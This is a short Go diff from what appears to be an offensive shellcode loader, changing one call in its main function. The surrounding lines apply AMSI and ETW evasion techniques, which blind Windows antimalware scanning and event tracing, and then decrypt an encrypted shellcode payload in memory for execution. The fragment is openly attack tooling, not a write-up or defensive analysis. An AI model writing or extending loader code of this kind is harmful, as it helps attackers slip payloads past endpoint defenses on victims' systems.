@@ -211,7 +211,7 @@ func main() {
     defer caller.Close()
 
     // 2. Apply evasion
-    evasion.Apply(caller, amsi.Technique(), etw.Technique())
+    evasion.ApplyAll(caller, amsi.Technique(), etw.Technique())
 
     // 3. Decrypt payload in memory
     shellcode, err := crypto.DecryptAESGCM(aesKey, encryptedPayload)
